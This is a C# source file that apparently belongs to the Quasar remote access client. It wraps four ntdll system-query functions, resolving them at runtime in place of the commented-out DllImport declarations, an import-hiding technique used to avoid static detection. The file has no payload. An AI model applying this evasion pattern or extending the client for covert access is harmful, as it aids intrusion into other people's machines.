﻿using Microsoft.Win32.SafeHandles;
using Quasar.Client.Utilities;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Text;

namespace Quasar.Client.Win32PE.Structs
{
    public static partial class NativeMethods
    {
        //[DllImport("ntdll.dll")]
        internal delegate IntPtr NtCurrentTebProc();
        internal static IntPtr NtCurrentTeb() => ClientNatives.Lookup<NtCurrentTebProc>("ntdll.dll", "NtCurrentTeb")();

        //[DllImport("ntdll.dll")]
        internal delegate NT_STATUS NtQuerySystemInformationProc(
            [In] SYSTEM_INFORMATION_CLASS SystemInformationClass,
            [In] IntPtr SystemInformation,
            [In] int SystemInformationLength,
            [Out] out int ReturnLength);
        internal static NT_STATUS NtQuerySystemInformation(
            [In] SYSTEM_INFORMATION_CLASS SystemInformationClass,
            [In] IntPtr SystemInformation,
            [In] int SystemInformationLength,
            [Out] out int ReturnLength) => ClientNatives.Lookup<NtQuerySystemInformationProc>("ntdll.dll", "NtQuerySystemInformation")(SystemInformationClass, SystemInformation, SystemInformationLength, out ReturnLength);

        //[DllImport("ntdll.dll")]
        internal delegate NT_STATUS NtQueryInformationProcessProc(
            [In] IntPtr ProcessHandle,
            [In] PROCESS_INFORMATION_CLASS ProcessInformationClass,
            [In] IntPtr ProcessInformation,
            [In] int ProcessInformationLength,
            [Out] out int ReturnLength);
        internal static NT_STATUS NtQueryInformationProcess(
            [In] IntPtr ProcessHandle,
            [In] PROCESS_INFORMATION_CLASS ProcessInformationClass,
            [In] IntPtr ProcessInformation,
            [In] int ProcessInformationLength,
            [Out] out int ReturnLength) => ClientNatives.Lookup<NtQueryInformationProcessProc>("ntdll.dll", "NtQueryInformationProcess")(ProcessHandle, ProcessInformationClass, ProcessInformation, ProcessInformationLength, out ReturnLength);


        //[DllImport("ntdll.dll")]
        internal delegate NT_STATUS NtQueryObjectProc(
            [In] IntPtr Handle,
            [In] OBJECT_INFORMATION_CLASS ObjectInformationClass,
            [In] IntPtr ObjectInformation,
            [In] int ObjectInformationLength,
            [Out] out int ReturnLength);
        internal static NT_STATUS NtQueryObject(
            [In] IntPtr Handle,
            [In] OBJECT_INFORMATION_CLASS ObjectInformationClass,
            [In] IntPtr ObjectInformation,
            [In] int ObjectInformationLength,
            [Out] out int ReturnLength) => ClientNatives.Lookup<NtQueryObjectProc>("ntdll.dll", "NtQueryObject")(Handle, ObjectInformationClass, ObjectInformation, ObjectInformationLength, out ReturnLength);
    }
}
